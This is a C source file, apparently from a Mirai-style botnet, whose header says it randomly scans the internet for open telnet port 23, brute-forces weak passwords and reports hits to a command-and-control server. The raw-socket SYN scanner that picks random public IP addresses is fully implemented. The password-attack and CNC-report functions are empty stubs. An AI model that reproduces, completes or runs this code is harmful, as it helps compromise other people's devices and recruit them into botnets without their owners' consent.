/* scanner.c
p* 1.randomly scan whelther host opened port 23
 * 2.if the host opens port 23, perform weak password attack
 * 3.if telnet login succeeds, report host information to CNC
 * 
 * create by Nrehearsal at 2018-04-02
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <strings.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>

#include "mt_random.h"
#include "customize.h"
#include "scanner.h"

static uint8_t raw_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
static int rawsock;
static uint32_t LOCAL_ADDR1;
uint16_t source_port = 0;
uint32_t source_ip = 0;

static ipv4_t scan_get_random_ip()
{
	uint8_t part1, part2, part3, part4;
	ipv4_t rand_ip = 0;

	do
	{
		rand_ip = rand_genrand_int32();
		//convert address to network byte order
		//rand_ip = htonl(rand_ip);

		part1 = (rand_ip >> 0) & 0xff;	
		part2 = (rand_ip >> 8) & 0xff;
		part3 = (rand_ip >> 16) & 0xff;
		part4 = (rand_ip >> 24) & 0xff;

	}while(part1 == 0 || part1 == 10 || part1 == 127 ||
			(part1 == 192 && part2 == 168) ||
			(part1 == 172 && part2 >= 16 && part2 < 32) ||
			(part1 == 100 && part2 >= 64 && part2 < 127) ||
			(part1 == 169 && part2 > 254) ||
			(part1 == 198 && part2 >= 18 && part2 < 20) ||
			(part1 >= 224)
		  );
	return INET_ADDR(part1, part2, part3, part4);
}

static void scan_get_random_port()
{

	do
	{
		source_port = rand_genrand_int32() & 0xffff;
	}while(ntohs(source_port) < 1024 || ntohs(source_port) == SINGLE_INSTANCE_PORT);
}

static void scan_fill_iphdr_fixed(struct iphdr* iph)
{
	//version:ipv4
	iph->version = 4;
	//ip header length:minimum value 5
	iph->ihl = 5;
	//type of service:
	iph->tos = 0;
	//total length:ip header + tcp header
	iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
	//time to live
	iph->ttl = 64;
	//protocol:tcp
	iph->protocol = IPPROTO_TCP;
	//source addr
	iph->saddr = source_ip;
}

static void scan_fill_tcphdr_fixed(struct tcphdr* tcph)
{
	//tcp source port:a random value
	scan_get_random_port();
	tcph->source = source_port;
	//tcp head length:5, 5*4 20bytes
	tcph->doff = 5;
	//tcp windows size:a random value
	tcph->window = rand_genrand_int32() & 0xffff;
	//tcp SYN flag:1, request connection
	tcph->syn = 1;
}

static uint16_t scan_checksum_ip(uint16_t* tiph, int hlength)
{
	register uint32_t checksum = 0;	
	while (hlength > 1)
	{
		checksum += *tiph++;
		hlength -= 2;
	}
	if (hlength> 0)
	{
#ifdef BIG_ENDIAN
		checksum+=(*(uint8_t*)tiph)<<8;
#else
		checksum+=*(uint8_t*)tiph;
#endif
	}
	//TODO:	until the carry is zero
	while (checksum >> 16)
	{
		checksum = (checksum >> 16)	 + (checksum & 0xffff);
	}

	return (uint16_t)(~checksum);
}

static uint16_t scan_checksum_tcpudp(struct iphdr *iph, uint16_t *tcpudphd, uint16_t data_len)
{
	register uint32_t checksum = 0;
	uint32_t ip_src = iph->saddr;
	uint32_t ip_dst = iph->daddr;
	int len = data_len;
	
	while(len > 1)
	{
		checksum += *tcpudphd++;
		len -= 2;
	}
	if (len > 0)
	{
#ifdef BIG_ENDIAN
		checksum+=(*(uint8_t*)tcpudphd) << 8;
#else
		checksum+=*(uint8_t*)tcpudphd;
#endif
	}

	checksum += (ip_src >> 16) & 0xffff;
	checksum += ip_src & 0xffff;
	checksum += (ip_dst >> 16) & 0xffff;
	checksum += ip_dst & 0xffff;
	checksum += htons(iph->protocol);
	checksum += data_len;

	//Util carry is zero
	while(checksum >> 16)
	{
		checksum = (checksum >> 16)	+ (checksum & 0xffff);
	}

	return (uint16_t)(~checksum);
}

static void scan_telnet_go()
{
	struct iphdr *iph;
	struct tcphdr *tcph;
	int i;
	
	iph = (struct iphdr*)(raw_packet);
	scan_fill_iphdr_fixed(iph);
	tcph = (struct tcphdr*)(iph + 1);
	scan_fill_tcphdr_fixed(tcph);
	iph = NULL;
	tcph = NULL;

	while(TRUE)
	{
		for (i = 0; i < PER_TIME_MAX; i++)
		{
			struct sockaddr_in taddr;
			bzero(&taddr, sizeof(taddr));
			struct iphdr *tiph = (struct iphdr*)(raw_packet);
			struct tcphdr *ttcph = (struct tcphdr*)(tiph+1);
			
			//fill target ip segment
			tiph->id = rand_genrand_int32() & 0xffff;
			tiph->saddr = source_ip;
			tiph->daddr = scan_get_random_ip();
			//tiph->daddr = INET_ADDR(118,89,62,21);
			tiph->check = 0;
			tiph->check = scan_checksum_ip((uint16_t*)tiph, sizeof(struct iphdr));

			//fill target tcp segment
			ttcph->dest = htons(23);
			ttcph->seq = tiph->daddr;
			ttcph->check = 0;
			ttcph->check = scan_checksum_tcpudp(tiph, (uint16_t*)ttcph, (uint16_t)sizeof(struct tcphdr));


			taddr.sin_family = AF_INET;
			taddr.sin_addr.s_addr = tiph->daddr;
			taddr.sin_port = ttcph->dest;
			//printf("to %d\n", ntohs(ttcph->dest));
			
			//start
			sendto(rawsock, raw_packet, sizeof(raw_packet), MSG_NOSIGNAL, (struct sockaddr*)&taddr, sizeof(taddr));
			tiph = NULL;
			ttcph = NULL;
		}

		i = 0;

		while(TRUE)
		{
			//MTU 1500 + !4_ETHERNET_HEADER
			char response[1514] = {0};
			struct iphdr *riph = (struct iphdr*)(response);
			struct tcphdr *rtcph = (struct tcphdr*)(riph + 1);
			int readn;
			errno = 0;

			readn = recvfrom(rawsock, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
			if (readn <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
			{
				//printf("readn < 0\n");
				//perror("recvfrom\n");
				break;
			}

			if (readn < sizeof(struct iphdr) + sizeof(struct tcphdr))
			{
				riph = NULL;
				rtcph = NULL;
				//printf("readn !=\n");
				continue;		
			}

			//printf("[Scanner]Recevice from:%d.%d.%d.%d \n", (iph->daddr & 0xff), (iph->daddr>> 8) & 0xff, (iph->daddr>> 16) & 0xff, (iph->daddr>> 24) & 0xff);

			if (riph->daddr != source_ip)
			{
				//printf("[Scanner]Target %d.%d.%d.%d open port 23\n", (riph->saddr & 0xff), (riph->saddr>> 8) & 0xff, (riph->saddr>> 16) & 0xff, (riph->saddr>> 24) & 0xff);
				continue;		
			}
			if (riph->protocol != IPPROTO_TCP)
			{
				//printf("protocol \n");
				continue;	
			}

			if (rtcph->dest != source_port)
			{
				//printf("source port: ");
				//printf("%d\n", ntohs(rtcph->dest));
				continue;	
			}

			if (rtcph->source != htons(23))
			{
				//printf("from %d---->", ntohs(rtcph->source));
				continue;	
			}

			if (!rtcph->syn)
			{
				//printf("syn \n");
				continue;	
			}
			if (!rtcph->ack)
			{
				//printf("ack \n");
				continue;	
			}
			if (rtcph->rst)
			{
				//printf("rst \n");
				continue;	
			}
			if (rtcph->fin)
			{
				//printf("fin \n");
				continue;	
			}
			//because we use the destination ip address to populate seq
			if (htonl(ntohl(rtcph->ack_seq) - 1) != riph->saddr)
			{
				//printf("seq \n");
				continue;
			}

			printf("[Scanner]Target %d.%d.%d.%d open port 23, attempting to brute\n", (riph->saddr & 0xff), (riph->saddr >> 8) & 0xff, (riph->saddr >> 16) & 0xff, (riph->saddr >> 24) & 0xff);

			if (i++ == 120)
			{
				break;
			}
		}
		sleep(1);
	}
}

static ipv4_t scan_get_localaddr()
{
	int fd;
	struct sockaddr_in addr;
	socklen_t socklen = sizeof(struct sockaddr_in);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
	addr.sin_port = htons(53);
	connect(fd, (struct sockaddr*)&addr, sizeof(struct sockaddr_in));
	getsockname(fd, (struct sockaddr*)&addr, &socklen);
	close(fd);

	return addr.sin_addr.s_addr;
}

static void scan_wake_password()
{
		
}

static void scan_report_find_tartget(struct host_info* target_info)
{

}

void main()
{
	rand_init_by_array();
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (rawsock == -1)
	{
		//printf("[Scanner]Create socket rawsock failed\n");
		//try again;
		perror("[Scanner]socket\n");
		exit(-1);
	}
	fcntl(rawsock, F_SETFL, O_NONBLOCK | fcntl(rawsock, F_GETFL, 0));
	int opt = 1;
	setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));
	source_ip = scan_get_localaddr();
	scan_telnet_go();
}
